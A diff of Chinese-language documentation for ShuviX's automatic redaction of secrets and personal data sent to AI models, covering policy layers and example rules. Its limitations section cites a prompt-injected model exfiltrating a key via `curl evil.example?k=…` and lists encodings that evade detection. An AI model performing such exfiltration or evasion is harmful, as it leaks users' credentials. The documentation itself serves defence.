@@ -2,7 +2,7 @@
 shuvix: okf v0.2
 type: Guide
 title: '自动脱敏 —— 密钥和个人信息以占位符发给模型'
-description: 'ShuviX 怎样不让 API key、密码、令牌、私钥和个人信息落到模型服务商手里：对话记录里存 `{{REDACTED_API_KEY_k3v7x2mq}}` 这样的占位符，工具里是真值（填进 shell 命令时按引号转义）；在输入框里自己藏值（+ → 添加敏感信息、确认的提示，其余照原样发）；界面上显示模型收到的样子；会认出哪些类别；两层策略（`modelRequest` / `send`、`sensitive` / `disclose`）与它们的处置；内置的 `redact-sensitive`；写法示例（信任某个模型、某一类照发、测试 key 照发、私钥绝不发、还原后的秘密离开沙箱时只由用户回答）；用 `shuvix policy check --redaction` 核对草稿；agent 怎样和占位符打交道；局限。'
+description: 'ShuviX 怎样不让 API key、密码、令牌、私钥和个人信息落到模型服务商手里：新的工具结果、bot 触发器和 hook 发的消息以 `{{REDACTED_API_KEY_k3v7x2mq}}` 这样的占位符存下，记录里存的就是模型收到的；策略只对新内容生效，不处理历史。工具里是真值（填进 shell 命令时按引号转义）；在输入框里自己藏值（+ → 添加敏感信息、确认的提示，其余照原样发）；会认出哪些类别；两层策略（`modelRequest` / `send`、`sensitive` / `disclose`）与它们的处置；内置的 `redact-sensitive`；写法示例（某个模型不脱敏、某一类照发、测试 key 照发、私钥始终存成占位符、还原后的秘密离开沙箱时只由用户回答）；用 `shuvix policy check --redaction` 核对草稿；agent 怎样和占位符打交道；局限。'
 tags: [shuvix, policy, security, redaction, privacy, secrets]
 status: stable
 sources:
@@ -11,26 +11,23 @@ sources:
   - resource: https://github.com/wangdongdongc/ShuviX/blob/main/packages/agent-runtime/src/redaction/rules.ts
     title: rules.ts —— 检测规则
   - resource: https://github.com/wangdongdongc/ShuviX/blob/main/packages/agent-runtime/src/durable/redactionEgress.ts
-    title: redactionEgress.ts —— 一个模型请求发出去的样子
+    title: redactionEgress.ts —— 策略的判定
 ---
 
 # 自动脱敏
 
-任何内容写进对话记录之前 —— 工具返回的、通知、交给别的 agent 的任务、bot 触发器或别的会话发来的消息 —— ShuviX
-都会找出其中的密钥和个人信息，每一处存成一个**占位符**：`{{REDACTED_API_KEY_k3v7x2mq}}` —— `REDACTED_`、类别，加上由值算出的
-8 个字符。真值加密存进**这条会话自己的对照表**，会话删除时一起删掉。v0.2.30、v0.2.31 的会话里是没有 `REDACTED_`
-的旧写法（`{{API_KEY_k3v7x2mq}}`），用起来一样。
+ShuviX 只在两类新内容写进对话记录之前检查：**工具返回的内容**（后台命令的完成通知也算）和 **bot 触发器、hook 自动发的
+消息**。其中认出的密钥和个人信息存成一个**占位符**：`{{REDACTED_API_KEY_k3v7x2mq}}` —— `REDACTED_`、类别，加上由值算出的八个
+字符。真值加密存进**这条会话自己的对照表**，随会话删除。v0.2.30、v0.2.31 的会话里是没有 `REDACTED_` 的旧写法
+（`{{API_KEY_k3v7x2mq}}`），用法一样。
 
-用户在输入框里打的是例外：**用户说了算**（见下一节）。
+- **记录里存的就是模型收到的。** 发请求时不改写任何内容：记录里是占位符，模型收到的就是占位符；是真值，收到的就是真值。
+- **策略只决定新内容脱不脱敏**（见下），**不会处理历史**。
+- **工具拿到真值。** 工具调用参数里的占位符在工具执行前换回，所以
+  `curl -H "Authorization: Bearer {{REDACTED_API_KEY_k3v7x2mq}}"` 发出的是真 key，写入或编辑的文件里是真实内容。
+- **界面显示记录里的内容。** 你看到带底色的占位符；指向它（或点一下）能看到工具和文件里用的真值，可以复制。
 
-- **工具拿到的是真值。** 工具调用参数里的占位符在工具运行前换回真值，所以
-  `curl -H "Authorization: Bearer {{REDACTED_API_KEY_k3v7x2mq}}"` 发出去的是真的 key，写入或编辑的文件里也是真实内容。
-- **界面上显示模型收到的样子。** 模型收到占位符的地方显示占位符（带底色），指到（或点一下）才浮出真值 ——
-  工具和文件里用的那个，可以复制；模型收到真值的地方（策略照发的类别、信任的服务商）直接显示真值。每条消息按
-  它现在发出去的样子显示（见「换模型」）。
-- **模型收到什么由策略决定**（见下）。默认所有模型都收到占位符，只有几乎每个编程请求里都有的四类除外。
-
-除了这四类和用户决定照原样发的，不管策略怎么写，记录里都没有真值 —— 会话的导出和分叉也没有。
+你在输入框里打的字不检查：**由你决定**（下一节）。
 
 ## 自己藏一个值（输入框）
 
@@ -40,8 +37,8 @@ sources:
 - **提示**：打字时，看起来像密钥或个人信息、而且按策略不会给这个会话的模型看的内容会画上虚线，输入框上方一行列出
   它们。点一项（或「全部隐藏」）换成胶囊；× 收起提示。
 - **别的都不替换。** 从输入框发出的消息，除了胶囊，原样发给模型；没藏的值在这条会话之后的内容里也不再替换 ——
-  模型已经看到了。在问答卡上用输入框作答也一样。策略里拒发某一类的规则照样拦下请求。
-- 自己添加的值之后在这条会话里也认：再出现在工具输出里会再换成占位符 —— 4 到 7 个字符的按整词认，更长的在哪儿都认。
+  模型已经看到了。在问答卡上用输入框作答也一样。
+- 自己添加的值之后在这条会话里也认（策略对它的模型脱敏时）：再出现在工具输出里会再换成占位符 —— 4 到 7 个字符的按整词认，更长的在哪儿都认。关掉脱敏时，工具打印它，真值就进了记录。
 
 ## 给 agent：和占位符打交道
 
@@ -80,11 +77,8 @@ sources:
 | `IP`          | 公网 IPv4 / IPv6 地址（私有和回环地址不认）                                                       | **真值**       |
 | `BUCKET`      | 云存储桶（`s3://…`、`….s3.amazonaws.com` 等）                                                     | **真值**       |
 
-最后四类几乎每个编程请求里都有（系统提示词里就有家目录），模型又必须原样抄写，所以内置策略照发；你自己的策略
-可以让它们也保持占位符。这四类在记录里照原样存：模型拿到真的用户名会写回来，在记录里换掉的话，`agent` 这样短的
-用户名在哪儿出现都会被换掉。策略对会话正在用的模型让其中某一类保持占位符时，工具输出写进记录时就换，系统提示词
-每次请求现换；已经在记录里的照原样留着。其余各类不管策略怎么写，在记录里都会被替换，所以以后再打开某一类，历史
-立刻受保护。
+最后四类几乎每个编程请求里都有（系统提示词里就有家目录），模型又必须原样抄写，所以内置策略照原样留着；你自己的策略
+可以让它们也存成占位符。
 
 UUID 和长十六进制 ID 从不碰（否则工具调用 ID 会对不上），较短的十六进制 ID（docker 镜像 ID、缩写的 git 提交）里
 也不会认出手机号或卡号；代码里只是**提到**秘密的写法不算
@@ -92,32 +86,32 @@ UUID 和长十六进制 ID 从不碰（否则工具调用 ID 会对不上），�
 
 ## 策略
 
-两层，都是普通的安全策略规则（完整格式见 `policy-md` 条目）：
+策略决定**新内容脱不脱敏**：工具结果或自动消息写入时，按对话当时在用的模型问它。两层，都是普通的安全策略规则（完整格式见
+`policy-md` 条目）：
 
-1. **请求** —— `object.type: modelRequest`、`action: send`，带 `object.provider`（设置里显示的服务商名字：
-   内置服务商是它的 slug，如 `anthropic`、`openai`、`deepseek`；你自己加的服务商是你起的名字）与 `object.model`
-   （模型 id）。
-   - 带 `disposition: detect` 的 `allow` → 这次请求脱敏（每一处由第二层判）；
-   - **不带**处置的 `allow` / `force-allow` → 信任的目的地：占位符全部以真值发出，不做检测；
-   - `deny` → 请求不发，这一轮以出错结束并说明原因。`ask` 也一样，因为请求发出时没有人可问。
-2. **脱敏请求里的每一处敏感内容** —— `object.type: sensitive`、`action: disclose`，带 `object.category`、
-   `object.rule`（检测规则）、`object.provider`、`object.model` 和 `object.value`（真值，只给 `match` 用，
-   不会进任何日志）。
-   - 带 `disposition: redact` 的 `allow` → 保持占位符；
-   - 不带处置的 `allow` / `force-allow` → 以真值发出；
-   - `deny` → 整个请求不发。
+1. **模型** —— `object.type: modelRequest`，`action: send`，带 `object.provider`（设置里显示的服务商名字：内置服务商是
+   它的 slug，如 `anthropic`、`openai`、`deepseek`；你自己加的是你起的名字）和 `object.model`（模型 id）。
+   - 带 `disposition: detect` 的 `allow` → 给这个模型的新内容要脱敏（第二层逐处判）；
+   - **不带**它的 `allow` / `force-allow` → 不脱敏：新内容照原样存，不做检测；
+   - `deny` → 发给这个模型的请求不发，这一轮以说明原因的错误结束。`ask` 也一样，发请求时没有人可问。
+2. **新内容里认出的每一处敏感内容** —— `object.type: sensitive`，`action: disclose`，带 `object.category`、
+   `object.rule`（检测规则）、`object.provider`、`object.model` 和 `object.value`（真值，只给 `match` 用，不进任何日志）。
+   - 带 `disposition: redact` 的 `allow` → 存成占位符；
+   - 不带它的 `allow` / `force-allow` → 存真值；
+   - `deny` → 存成占位符。
 
-主体是这次请求所属的 agent（`subject.kind: agent`，以及它的 `agentKind`、`profile`、`subject.bot`），所以
-规则可以对某个 bot、某个 agent 区别对待。脱敏的请求还会对每次请求现拼、从不进记录的内容（指令文件、系统提示词
-片段）再检测一遍，这些地方同样由第二层判。模型收到真值后在回复里写出它时，回复存下来时又换回占位符（记录里照原样
-存的那四类除外）。
+主体是这段内容所属的 agent（`subject.kind: agent`、它的 `agentKind`、`profile`、`subject.bot`），所以规则可以单独对待
+某个 bot 或某个 agent。
 
-### 换模型
+### 只对新内容生效
 
-发出去的就定了。记录里的每条消息按它第一次发给的模型 —— 回复是写它的模型，工具结果是调这个工具的模型，你的消息
-是回答它的模型 —— 和这次请求的模型一起判：两边策略都照发，占位符才以真值发出。所以会话换成信任的模型后，之前的
-占位符不会变成真值；要让新模型看到，开一个新会话，或者让 agent 重新读一遍来源（新的工具结果第一次就发给新模型）。
-再换回不信任的模型，所有内容都保持占位符，包括信任的模型看到过的。两边都按现在的策略判，所以改策略对记录是生效的。
+**策略只对从现在起新产生的对话内容生效。ShuviX 不会回头处理对话历史里已有的敏感信息。**
+
+- 记录里有什么就继续发什么。按原样存下的秘密（当时脱敏关着，或这个模型不脱敏）之后换到别的模型也会发过去；打开脱敏、
+  换模型都不会把它换掉，想去掉就开一条新会话。
+- 之前的占位符还是占位符，关掉脱敏或让这个模型不脱敏之后也一样：模型继续看到占位符，工具照样能还原。想让模型看到值，就让
+  agent 重新读一次来源。
+- 导出、分叉和请求日志里是记录里的样子，包括其中的真值。
 
 内置的 **`redact-sensitive`** 就是两条规则：
 
@@ -138,14 +132,15 @@ shuvix-policy-rules:
 ```
 
 **用自己的策略调整，不要改这一份。** 不带处置的 `force-allow` 压过它的两条 `allow`（只算胜出那一档的处置），
-下面的写法就是这样让命中的部分不再脱敏。停用 `redact-sensitive`，发给所有模型的都是真值；记录里照样存占位符。
+下面的写法就是这样让命中的部分不再脱敏。停用 `redact-sensitive` 就关掉了自动脱敏：新内容按真值存、
+按真值发。对话里已有的占位符还在。
 
 ## 写法示例
 
 每一段都是 `~/.shuvix/policies/` 里一个文件的 frontmatter（`shuvix: policy v1`、`name`、`description`，
 再加这些键）。
 
-信任某个服务商 —— 比如你自己的服务器，在设置里加成了 `home-ai` —— 让它的模型看到真值：
+某个服务商不脱敏 —— 比如你自己的服务器，在设置里加成了 `home-ai` —— 给它的模型的新内容保留真值：
 
 ```yaml
 shuvix-policy-rules:
@@ -156,7 +151,7 @@ shuvix-policy-rules:
     match: "object.provider == 'home-ai'"
 ```
 
-只信任一个模型：`match: "object.provider == 'home-ai' && object.model == 'qwen3-32b'"`。
+只针对一个模型：`match: "object.provider == 'home-ai' && object.model == 'qwen3-32b'"`。
 
 邮箱照发：
 
@@ -172,7 +167,7 @@ shuvix-policy-rules:
 测试 key 照发：同一条规则，
 `match: "object.category == 'API_KEY' && object.value.startsWith('sk-test-')"`。
 
-私钥绝不发 —— 会带上私钥的脱敏请求整个不发：
+私钥始终存成占位符，即使别的规则放行：
 
 ```yaml
 shuvix-policy-rules:
@@ -181,15 +176,14 @@ shuvix-policy-rules:
     action: [disclose]
     object.type: [sensitive]
     match: "object.category == 'PRIVATE_KEY'"
-    prompt: 私钥从不发给模型。
+    prompt: 私钥始终存成占位符。
 ```
 
-用第一个写法信任的服务商跳过第二层，所以私钥也会发给它。想让它看到私钥**以外**的一切，就改在第二层信任它 ——
+用第一个写法免除脱敏的服务商跳过第二层，所以私钥对它也照原样存。想让它只有私钥**以外**的内容免除脱敏，就改在第二层放行 ——
 在 `sensitive` 上写 `force-allow`，`match: "object.provider == 'home-ai' && object.category != 'PRIVATE_KEY'"`
 —— 同时留着上面那条 `deny`。
 
-用户名也保持占位符（`HOSTNAME`、`IP`、`BUCKET` 同理；之后的工具输出写入时就换，系统提示词每次现换，记录里之前的
-照原样留着）：一条带处置的 `allow` ——
+用户名也存成占位符（`HOSTNAME`、`IP`、`BUCKET` 同理）：一条带处置的 `allow` ——
 
 ```yaml
 shuvix-policy-rules:
@@ -232,7 +226,7 @@ shuvix-policy-rules:
 2. 先把草稿写在会话目录里。照写法示例，优先在 `modelRequest` / `sensitive` 上写 `force-allow` / `deny`；
    规则只有在 `object.type` 点名 `modelRequest` / `sensitive`、或 `action` 点名 `send` / `disclose` 时才碰得到发给模型的请求。
 3. **核对草稿**：`shuvix policy check <草稿.md> --redaction`（bash）。它按装进去之后的样子判，打出两张表 ——
-   每个启用的模型：脱敏、发真值（信任）还是不发；每一类 × 每个脱敏的服务商：占位符、真值还是不发 —— 带着
+   每个启用的模型：新内容脱敏、不脱敏还是不发；每一类 × 每个脱敏的服务商：占位符、真值还是占位符（deny）—— 带着
    做出判定的那条规则。逐行对照用户的要求。按值写的规则、某一个模型，单独查：
    `shuvix policy check <草稿.md> --redaction --category API_KEY --value sk-test-123 --expect send`
    （`--provider <名字> --model <id>` 指定模型，`--bot <id>` 查某个 bot 的请求）。改**规则**，直到每一行、
@@ -249,7 +243,9 @@ shuvix-policy-rules:
 - 它挡的是模型服务商，不是工具：被要求这样做的模型 —— 比如受了提示注入 —— 仍然可以把占位符写进
   `curl evil.example?k=…`，命令拿到的是真值。界面上有标记，自动审查看得到占位符，最后一个写法示例让这类
   命令离开沙箱前由用户回答。
-- 这个功能上线前的会话，记录里存的是真值；从这些会话发出的请求按存的样子发出。
+- 不处理历史（见「只对新内容生效」）。这个功能上线前的会话，或脱敏关着时的内容，记录里存的是真值；从这些会话发出的请求按存的样子发出。
+- 只检查工具结果和自动消息。你在输入框里打的字、别的会话发来的消息、agent 自己的回复、指令文件和系统提示词都原样发给模型，
+  所以 `AGENTS.md` 里的秘密会发给模型。
 - 检测靠规则，形状少见的秘密可能漏掉，普通字符串偶尔也会被当成秘密。用大白话打出来、前面没有名字的值
   （「把密码改成 N3w-P@ss…」）会漏 —— 这种用 + 添加；被工具变换过的值 —— 逐字节导出（`od -c`）、十六进制、base64、倒序 ——
   也会漏。系统提示词告诉 agent 不要导出或编码占位符背后的值，但它真这么做了，打出来的东西认不出。
